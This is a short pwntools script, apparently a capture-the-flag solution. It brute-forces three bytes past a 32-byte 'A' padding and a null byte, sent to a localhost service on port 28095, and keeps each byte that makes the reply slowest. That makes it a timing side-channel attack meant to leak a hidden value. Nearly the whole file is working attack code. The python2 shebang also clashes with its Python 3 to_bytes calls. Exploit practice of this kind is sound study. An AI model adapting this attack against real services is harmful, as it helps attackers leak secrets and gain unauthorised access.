#!/usr/bin/env python2

import os
import re
import sys
import time

from pwn import *

context.arch = "x86"
context.log_level ='error'
context.bits = 32


base_payload = b'A'*32 + b'\x00'

for i in range(0, 3):
    bestTime = 0
    bestValue = -1
    for j in range(0, 256):
       p = remote('localhost', 28095)
       payload = base_payload + j.to_bytes(1, 'little')
       sendTime = time.time()
       p.send(payload)
       p.recvuntil("feedback")
       timeDiff = time.time() - sendTime
       if(timeDiff > bestTime):
           bestTime = timeDiff
           bestValue = j
    base_payload += bestValue.to_bytes(1, 'little')
    print(bestTime)
print(base_payload)




        


